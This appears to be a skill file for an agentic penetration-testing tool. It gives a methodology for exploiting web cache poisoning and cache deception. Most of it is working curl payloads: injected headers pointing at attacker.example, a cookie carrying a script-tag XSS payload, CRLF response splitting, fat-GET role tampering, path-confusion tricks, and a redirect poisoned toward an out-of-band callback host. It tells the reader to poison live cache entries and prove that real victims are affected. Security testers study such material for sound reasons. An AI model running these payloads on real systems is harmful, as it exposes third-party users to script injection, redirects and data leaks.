---
name: cache-poisoning
description: Detect and exploit web cache poisoning and cache deception vulnerabilities
origin: Vigil
vuln_class: cache-poisoning
---

# Cache Poisoning Testing

> **`vigil assess kali` audit flags:** use `--technique OTHER` (cache poisoning spans web-cache-deception, CPDoS, and unkeyed-header abuse — no dedicated enum class). Switch to `REQUEST-SMUGGLING` when the poisoning rides on a smuggled request.

## When to Activate

- Target sits behind a CDN, reverse proxy, or caching layer (Cloudflare, Akamai, Varnish, Nginx, Fastly)
- Responses include `X-Cache`, `Age`, `CF-Cache-Status`, `Via`, or `Vary` headers
- Testing for cache poisoning via unkeyed headers or cache deception via path normalization

## Tools

- `vigil assess kali exec -- curl ...` (header injection probing and cache behavior analysis — all target-facing curl must go through the kali exec wrapper so the request lands in the audit pipeline; use `--technique OTHER --probe-kind payload --phase consume-test --timeout 30` for probing calls)
- `vigil assess anomaly-score` — for unkeyed-input discovery (§2/§3): record one response per candidate header/cookie and let it rank which injected input actually shifted the response, instead of diffing curl bodies by eye.
- `vigil oob mint` / `vigil oob poll` — for redirect-based poisoning (§9) where the poisoned `Location` points at attacker infra: `mint` binds the nonce under a running client's interactsh id and prints the exact host (`$OOB_HOST`, of shape `<nonce>.<client-id>.oob.example.com`) so `poll` can correlate it — pass `--client <name>` when several clients run. Force the exact host mint prints into the cached redirect, then `poll` to confirm a victim followed it. Replaces reading the raw listener log. Readiness: `vigil oob status --json`.
- `Param Miner` (Burp extension for unkeyed header/parameter discovery)
- Browser (verify poisoned responses served to other users)

## Methodology

### 1. Cache Detection and Key Mapping
- [ ] Identify caching layer from response headers
```bash
curl -sI https://target/ | grep -iE "x-cache|age|cf-cache|via|vary|cdn|akamai|varnish|fastly"
```
- [ ] Determine cache key components: path, query string, Host header
- [ ] Send identical request twice — check if second returns `X-Cache: HIT` or `Age > 0`
- [ ] Add cache buster to isolate tests: `?cachebuster=random123`

### 2. Unkeyed Header Discovery
- [ ] Test common unkeyed headers that influence response content. Capture one response record per header (always with a fresh cache buster so each is an origin hit) and rank which header moved the response — the header that shifts status/length/content-type away from the no-header baseline is the unkeyed input worth poisoning:
```bash
{
  # baseline (no injected header) anchors the population
  read -r code len <<<"$(curl -s -o /dev/null -w '%{http_code} %{size_download}' "https://target/?cb=base")"
  printf '{"url":"baseline","status":%s,"content_length":%s}\n' "$code" "$len"
  for h in "X-Forwarded-Host: attacker.example" "X-Forwarded-Scheme: http" \
           "X-Original-URL: /admin" "X-Rewrite-URL: /admin" \
           "X-Forwarded-Port: 443" "X-Host: attacker.example"; do
    cb=$(openssl rand -hex 4)
    read -r code len <<<"$(curl -s -o /dev/null -w '%{http_code} %{size_download}' -H "$h" "https://target/?cb=$cb")"
    printf '{"url":"%s","status":%s,"content_length":%s}\n' "${h%%:*}" "$code" "$len"
  done
} | vigil assess anomaly-score --top 8
```
- [ ] The top-ranked record names the header whose response broke from the baseline cluster — confirm the injected value is reflected (links, redirects, meta tags, scripts) in that response's body.
- [ ] If reflected, remove the cache buster and re-send to poison the real cache entry.

### 3. Unkeyed Cookie Testing
- [ ] Identify cookies that change response content but are excluded from cache key
```bash
curl -b "language=../../admin" https://target/?cb=test7
curl -b "region=<script>alert(1)</script>" https://target/?cb=test8
```
- [ ] Check `Vary` header — cookies only keyed if `Vary: Cookie` is present

### 4. Cache Poisoning via Response Splitting
- [ ] CRLF injection in cached response headers
```bash
curl "https://target/page%0d%0aX-Injected:header?cb=test9"
curl -H "X-Forwarded-Host: attacker.example%0d%0aContent-Length:%200%0d%0a%0d%0a<html>poisoned</html>" https://target/?cb=test10
```

### 5. Fat GET Request Poisoning
- [ ] Send GET request with body — some caches ignore body but origin processes it
```bash
curl -X GET -d '{"role":"admin"}' -H "Content-Type: application/json" https://target/api/user?cb=test11
```
- [ ] Compare response with and without body; if different, cache may store the modified version

### 6. Cache Deception
- [ ] Trick cache into storing authenticated/dynamic responses as static
```bash
# Path confusion: cache treats .css as static, origin ignores extension
curl https://target/account.css
curl https://target/account/nonexistent.js
curl https://target/account%2f..%2fstatic.css
```
- [ ] Path normalization differences between cache and origin
```bash
curl https://target/account/..%2fstatic/logo.png
curl https://target/static/../account
curl "https://target/account;.css"
```
- [ ] Check if authenticated user data cached and served to unauthenticated requests

### 7. Vary Header Abuse
- [ ] Identify `Vary` header values and test for incomplete keying
```bash
# If Vary: Accept-Encoding, test injection in other headers not in Vary
curl -H "Accept-Encoding: gzip" -H "X-Forwarded-Host: evil.example" https://target/
```
- [ ] Test `Vary: *` handling (should disable caching, but not always)

### 8. CDN-Specific Behaviors
- [ ] **Cloudflare**: test `cf-cache-status`, `__cf_bm` cookie, cache-everything page rules
- [ ] **Akamai**: test `Pragma: akamai-x-get-cache-key`, `X-Akamai-Staging`
- [ ] **Varnish**: test `X-Varnish`, custom VCL cache key configuration
- [ ] **Nginx**: test `X-Accel-Redirect`, `proxy_cache_key` configuration
- [ ] **Fastly**: test `Fastly-Debug: 1` header for cache key disclosure

### 9. Redirect-Based Poisoning
- [ ] Poison redirect target via `X-Forwarded-Scheme: http` / `X-Forwarded-Host` forcing a 301/302 to an attacker-controlled location. Point the poisoned redirect at a minted callback host so a victim following the cached redirect is provably attributable — `poll` turns "the redirect points at attacker.example" into "a real client followed the poisoned redirect":
```bash
vigil oob mint --client <name> --technique cache-poison --target-url "https://target/" \
  --param X-Forwarded-Host --probe-kind redirect-poison
# → host  <nonce>.<client-id>.oob.example.com   (= $OOB_HOST)
# Poison: force the cached Location to the exact host mint printed ($OOB_HOST)
curl -H "X-Forwarded-Host: $OOB_HOST" -H "X-Forwarded-Scheme: https" https://target/
# Confirm: a victim (or your own clean fetch of the cached entry) followed it
vigil oob poll --client <name>     # matched row = the poisoned redirect was followed
```
- [ ] If the 301/302 is cached, every user who hits the entry follows the poisoned redirect — a matched callback from a request that did NOT carry your header proves cross-user impact, not just that you can set your own Location.

## What to Record

- Cache layer identified (CDN, reverse proxy, product name and version if known)
- Unkeyed input that influences response (header, cookie, body) — the `anomaly-score` ranking that isolated it from the baseline is good corroborating evidence
- Exact request that poisons the cache
- Evidence that poisoned response is served to other users (second request without the unkeyed input) — confirming the primitive exists is not enough; you must show the **attacker outcome**: what a victim receives when they hit the poisoned cache entry (e.g., malicious script executes in victim's browser, victim is redirected to attacker-controlled domain, victim's sensitive data is served to an unauthenticated requester). For a redirect poison, the matched probe<->callback from `vigil oob poll --client <name> --json` on a header-free request IS that cross-user proof.
- Impact: XSS via poisoned response, redirect to attacker domain, sensitive data exposure via cache deception
- Full request/response pairs for both poisoning and victim requests

## Extended Resources
